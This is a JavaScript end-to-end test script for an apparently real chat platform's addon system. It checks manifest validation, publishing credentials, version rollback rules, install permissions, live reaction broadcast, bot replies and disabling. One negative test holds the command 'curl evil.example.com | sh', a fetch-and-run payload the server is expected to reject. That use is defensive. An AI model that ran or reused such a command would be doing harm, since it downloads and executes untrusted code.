// Verifies the addon system against the REAL deployment.
//
// The claim under test is that an addon is data, not code: it can only express things the server
// already knows how to do, publishing is tied to a revocable credential, and an installed
// automation genuinely runs. So the assertions split three ways — what the manifest schema
// refuses, what the publish flow refuses, and one end-to-end proof that a real message in a real
// channel triggers a real action.
import { execFileSync } from "node:child_process";
import { io } from "socket.io-client";

const BASE = process.env.LUMINA_BASE ?? "https://lumina.badgerstudios.net";
const REPO = "/home/lucid/lumina";
const rand = Date.now();
const PASSWORD = "verify-addons-pw-1";
let pass = 0,
  fail = 0;
const ok = (m) => (console.log(`PASS: ${m}`), pass++);
const bad = (m) => (console.log(`FAIL: ${m}`), fail++);

const sql = (q) =>
  execFileSync("docker", ["compose", "exec", "-T", "postgres", "psql", "-U", "lumina", "-d", "lumina", "-tAc", q], {
    cwd: REPO,
    encoding: "utf8",
  }).trim();

async function mkUser(username) {
  const res = await fetch(`${BASE}/api/auth/register`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({
      username, email: `${username}@example.com`, password: PASSWORD,
      ageBracket: "AGE_25_34", birthDate: "1995-04-01",
    }),
  });
  if (!res.ok) throw new Error(`register ${username}: ${res.status} ${await res.text()}`);
  return (await res.json()).accessToken;
}

const call = async (token, path, init = {}) => {
  const res = await fetch(`${BASE}/api${path}`, {
    ...init,
    headers: {
      ...(token ? { authorization: `Bearer ${token}` } : {}),
      ...(init.body ? { "content-type": "application/json" } : {}),
      ...(init.headers ?? {}),
    },
  });
  return { status: res.status, body: await res.json().catch(() => null) };
};

const publish = (clientId, clientSecret, manifest) =>
  call(null, "/addons/publish", { method: "POST", body: JSON.stringify({ clientId, clientSecret, manifest }) });

const KEYWORD = `addonping${rand}`;
const TRIGGER = `ping${rand}`;

function reactManifest(slug, version = "1.0.0") {
  return {
    slug,
    name: "Verify Reactor",
    description: "Reacts to a keyword",
    version,
    automations: [
      {
        name: "React to the keyword",
        on: "message.create",
        when: { contains: [KEYWORD] },
        then: [{ type: "react", emoji: "👀" }],
      },
    ],
  };
}

async function main() {
  const dev = `vadd_dev_${rand}`;
  const outsider = `vadd_out_${rand}`;
  const slug = `verify-reactor-${rand}`;
  const openSlug = `verify-open-${rand}`;
  const replySlug = `verify-replier-${rand}`;

  try {
    const devToken = await mkUser(dev);
    const outsiderToken = await mkUser(outsider);

    // An Application is the publishing credential — deliberately the existing one rather than a
    // second credential system invented for addons.
    const app = await call(devToken, "/applications", {
      method: "POST",
      body: JSON.stringify({ name: `Verify Addons ${rand}` }),
    });
    if (app.status !== 201 && app.status !== 200) return bad(`could not create an application: ${app.status}`);
    const clientId = app.body.id;
    // The bot token, not the OAuth client secret. Generating a client secret requires a redirect
    // URI first, which an addon that only reacts to a keyword has no reason to have — so publish
    // accepts either credential, and this exercises the path a real author would take.
    const regen = await call(devToken, `/applications/${clientId}/regenerate-token`, { method: "POST" });
    const clientSecret = regen.body?.botToken ?? regen.body?.token;
    if (!clientSecret) return bad(`no bot token returned: ${JSON.stringify(regen.body)}`);
    ok("an application can be created and given a publishing credential");

    // ---- what the manifest schema refuses --------------------------------------------------
    const arbitraryCode = await publish(clientId, clientSecret, {
      ...reactManifest(slug),
      automations: [
        {
          name: "run something",
          on: "message.create",
          when: { contains: ["x"] },
          // The action an executable plugin format would happily accept.
          then: [{ type: "exec", command: "curl evil.example.com | sh" }],
        },
      ],
    });
    if (arbitraryCode.status === 400) ok("a manifest asking to run a command is rejected outright");
    else bad(`an "exec" action returned ${arbitraryCode.status}`);

    const extraKey = await publish(clientId, clientSecret, {
      ...reactManifest(slug),
      automations: [
        { name: "x", on: "message.create", when: { contains: ["x"] }, then: [{ type: "react", emoji: "👀" }], webhook: "http://x" },
      ],
    });
    // .strict() everywhere is what makes this fail — an unknown key can never be silently carried
    // along and later interpreted by something else.
    if (extraKey.status === 400) ok("an unknown field in a manifest is rejected, not ignored");
    else bad(`an unknown manifest field returned ${extraKey.status}`);

    const badVersion = await publish(clientId, clientSecret, { ...reactManifest(slug), version: "one" });
    if (badVersion.status === 400) ok("a non-semver version is rejected");
    else bad(`version "one" returned ${badVersion.status}`);

    // Every Application in Lumina is created with a bot user, so the "refuse a reply addon with no
    // bot" guard is defensive rather than commonly reached. The assertion worth making is the
    // positive one: a reply addon publishes, installs, and the reply genuinely appears — which is
    // tested end to end further down.
    const replyPublish = await publish(clientId, clientSecret, {
      slug: replySlug,
      name: "Verify Replier",
      version: "1.0.0",
      automations: [
        {
          name: "answer",
          on: "message.create",
          when: { startsWith: [`!${TRIGGER}`] },
          then: [{ type: "reply", text: "heard you, {user}" }],
        },
      ],
    });
    if (replyPublish.status === 201) ok("an addon with a reply action publishes");
    else bad(`publishing a reply addon returned ${replyPublish.status}: ${replyPublish.body?.error}`);

    // ---- what the publish flow refuses ------------------------------------------------------
    const wrongSecret = await publish(clientId, "not-the-secret", reactManifest(slug));
    if (wrongSecret.status === 403) ok("publishing with a wrong client secret is refused (403)");
    else bad(`a wrong client secret returned ${wrongSecret.status}`);

    // ---- a valid publish --------------------------------------------------------------------
    const published = await publish(clientId, clientSecret, reactManifest(slug));
    if (published.status === 201) ok(`published ${slug} v1.0.0`);
    else return bad(`publishing a valid manifest returned ${published.status}: ${published.body?.error}`);

    const republish = await publish(clientId, clientSecret, reactManifest(slug, "1.0.0"));
    if (republish.status === 409) ok("republishing the same version is refused");
    else bad(`republishing v1.0.0 returned ${republish.status}`);

    const rollback = await publish(clientId, clientSecret, reactManifest(slug, "0.9.0"));
    // The property that matters: a stolen secret cannot quietly revert every install to an older
    // manifest.
    if (rollback.status === 409) ok("a version cannot go backwards");
    else bad(`publishing v0.9.0 over v1.0.0 returned ${rollback.status}`);

    const upgrade = await publish(clientId, clientSecret, reactManifest(slug, "1.0.1"));
    if (upgrade.status === 200) ok("a newer version replaces the published one");
    else bad(`publishing v1.0.1 returned ${upgrade.status}`);

    // ---- install permissions -----------------------------------------------------------------
    const server = await call(devToken, "/servers", {
      method: "POST",
      body: JSON.stringify({ name: `Addon Verify ${rand}` }),
    });
    const serverId = server.body.id;
    const channels = await call(devToken, `/servers/${serverId}/channels`);
    const general = (channels.body ?? []).find((c) => c.type === "TEXT");
    if (!general) return bad("the new server has no text channel to test in");

    const outsiderInstall = await call(outsiderToken, `/servers/${serverId}/addons`, {
      method: "POST",
      body: JSON.stringify({ slug }),
    });
    if (outsiderInstall.status === 403 || outsiderInstall.status === 404) {
      ok(`someone with no rights on the server cannot install into it (${outsiderInstall.status})`);
    } else {
      bad(`an outsider install returned ${outsiderInstall.status}`);
    }

    const installed = await call(devToken, `/servers/${serverId}/addons`, {
      method: "POST",
      body: JSON.stringify({ slug }),
    });
    if (installed.status === 201) ok("the server owner can install the addon");
    else return bad(`install returned ${installed.status}: ${installed.body?.error}`);

    // ---- and it actually runs -----------------------------------------------------------------
    // Listening on a real socket, not only checking the database.
    //
    // This is the assertion that caught a real bug: the runtime wrote the reaction row and never
    // emitted, so the database was correct while every open client kept showing the message
    // unreacted until a reload. A test that asserts only against the database passes straight
    // through that — the row IS there.
    const socket = io(BASE, {
      auth: { accessToken: devToken },
      transports: ["websocket"],
      reconnection: false,
      path: "/socket.io",
    });
    const events = [];
    await new Promise((resolve, reject) => {
      socket.on("connect", resolve);
      socket.on("connect_error", reject);
      setTimeout(() => reject(new Error("socket connect timed out")), 10_000);
    });
    await new Promise((resolve, reject) =>
      socket.emit("channel:join", { channelId: general.id }, (res) =>
        res?.ok ? resolve() : reject(new Error(JSON.stringify(res))),
      ),
    );
    for (const name of ["reaction:add", "message:update", "message:delete"]) {
      socket.on(name, (payload) => events.push({ name, payload }));
    }

    const sent = await call(devToken, `/channels/${general.id}/messages`, {
      method: "POST",
      body: JSON.stringify({ content: `hello ${KEYWORD} world` }),
    });
    if (sent.status !== 201) return bad(`sending a message returned ${sent.status}`);

    // Automations run fire-and-forget after the send returns, so the reaction lands a moment later.
    const reacted = await waitFor(() =>
      sql(`select count(*) from "Reaction" where "messageId" = ${sent.body.id} and emoji = '👀';`) === "1",
    );
    if (reacted) ok("the installed automation reacted to a real message");
    else bad("the automation did not fire on a matching message");

    const broadcast = await waitFor(() =>
      events.some((e) => e.name === "reaction:add" && e.payload?.messageId === sent.body.id),
    );
    if (broadcast) ok("the reaction is broadcast live, not only written to the database");
    else bad("the reaction never reached connected clients — they'd show it only after a reload");
    socket.close();

    // A message that doesn't match must be left alone — otherwise "it reacted" proves nothing.
    const unmatched = await call(devToken, `/channels/${general.id}/messages`, {
      method: "POST",
      body: JSON.stringify({ content: "an ordinary message" }),
    });
    await new Promise((r) => setTimeout(r, 3000));
    if (sql(`select count(*) from "Reaction" where "messageId" = ${unmatched.body.id};`) === "0") {
      ok("a message that doesn't match the condition is untouched");
    } else {
      bad("the automation fired on a message it shouldn't have matched");
    }

    // An automation with no conditions would fire on every message in the server. Treated as a
    // manifest mistake rather than as intent.
    const openAddon = await publish(clientId, clientSecret, {
      slug: openSlug,
      name: "Verify Open",
      version: "1.0.0",
      automations: [{ name: "everything", on: "message.create", when: {}, then: [{ type: "react", emoji: "🔥" }] }],
    });
    if (openAddon.status === 201) {
      await call(devToken, `/servers/${serverId}/addons`, { method: "POST", body: JSON.stringify({ slug: openSlug }) });
      const probe = await call(devToken, `/channels/${general.id}/messages`, {
        method: "POST",
        body: JSON.stringify({ content: "nothing special here" }),
      });
      await new Promise((r) => setTimeout(r, 3000));
      if (sql(`select count(*) from "Reaction" where "messageId" = ${probe.body.id} and emoji = '🔥';`) === "0") {
        ok("an automation with no conditions never fires on everything");
      } else {
        bad("an empty condition matched every message");
      }
    } else {
      bad(`publishing the no-condition addon returned ${openAddon.status}`);
    }

    // ---- a reply actually posts, as the bot ------------------------------------------------------
    // The gap this closes: an addon that replies posts as its application's bot, and a bot can only
    // post in a server it belongs to. Installing has to join it, or the automation matches and
    // nothing ever appears.
    const replyInstall = await call(devToken, `/servers/${serverId}/addons`, {
      method: "POST",
      body: JSON.stringify({ slug: replySlug }),
    });
    if (replyInstall.body?.botJoined) ok("installing a reply addon joins its bot to the server");
    else bad(`installing the reply addon did not join a bot: ${JSON.stringify(replyInstall.body)}`);

    const triggered = await call(devToken, `/channels/${general.id}/messages`, {
      method: "POST",
      body: JSON.stringify({ content: `!${TRIGGER} are you there` }),
    });
    if (triggered.status !== 201) return bad(`sending the trigger returned ${triggered.status}`);

    const replied = await waitFor(
      () =>
        Number(
          sql(
            `select count(*) from "Message" m join "User" u on u.id = m."authorId" ` +
              `where m."channelId" = '${general.id}' and u."isBot" = true and m.content like 'heard you%';`,
          ),
        ) > 0,
    );
    if (replied) ok("the addon replied in the channel as its bot");
    else bad("the reply action produced no message");

    // ---- disabling stops it ---------------------------------------------------------------------
    const list = await call(devToken, `/servers/${serverId}/addons`);
    const install = (list.body ?? []).find((i) => i.addon.slug === slug);
    await call(devToken, `/servers/${serverId}/addons/${install.id}`, {
      method: "PATCH",
      body: JSON.stringify({ enabled: false }),
    });
    const afterDisable = await call(devToken, `/channels/${general.id}/messages`, {
      method: "POST",
      body: JSON.stringify({ content: `still ${KEYWORD} here` }),
    });
    await new Promise((r) => setTimeout(r, 3000));
    if (sql(`select count(*) from "Reaction" where "messageId" = ${afterDisable.body.id};`) === "0") {
      ok("disabling an addon stops its automations");
    } else {
      bad("a disabled addon still fired");
    }

    // ---- the CLI is real -------------------------------------------------------------------------
    try {
      const out = execFileSync("node", [`${REPO}/tools/lumina-cli/lumina-addons.mjs`, "list", slug], {
        encoding: "utf8",
        env: { ...process.env, LUMINA_API_BASE: BASE },
      });
      if (out.includes(slug)) ok("the CLI lists the published addon");
      else bad(`the CLI did not list ${slug}: ${out.trim().slice(0, 120)}`);
    } catch (e) {
      bad(`the CLI failed: ${e.message}`);
    }
  } catch (e) {
    bad(`addon flow: ${String(e).split("\n")[0]}`);
  } finally {
    sql(`delete from "Addon" where slug in ('${slug}', '${openSlug}', '${replySlug}');`);
    sql(`delete from "Server" where name like 'Addon Verify ${rand}%';`);
    sql(`delete from "User" where username in ('${dev}', '${outsider}');`);
    console.log(`cleaned up ${dev}, ${outsider}, ${slug}`);
  }

  console.log(`\n${pass} passed, ${fail} failed`);
  process.exit(fail === 0 ? 0 : 1);
}

async function waitFor(check, timeoutMs = 15_000) {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    if (check()) return true;
    await new Promise((r) => setTimeout(r, 1000));
  }
  return false;
}

main();
